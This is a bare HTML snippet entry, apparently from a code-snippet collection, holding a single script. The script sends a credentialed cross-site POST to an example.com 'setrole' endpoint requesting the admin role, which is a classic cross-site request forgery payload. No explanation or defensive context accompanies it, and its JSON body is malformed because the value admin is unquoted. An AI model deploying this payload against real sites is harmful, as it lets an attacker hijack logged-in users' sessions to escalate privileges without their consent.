---
id: 2cc93e97-b2cd-4823-a1d7-d3477537a0b1
type: code
language: HTML
verified: false
created_at: '2023-04-06T03:55:55.549184+00:00'
updated_at: '2023-04-06T03:55:55.552531+00:00'
---

# Code Snippet 2cc93e97

**Language**: HTML

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://www.example.com/api/setrole");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
xhr.send('{"role":admin}');
</script>
```


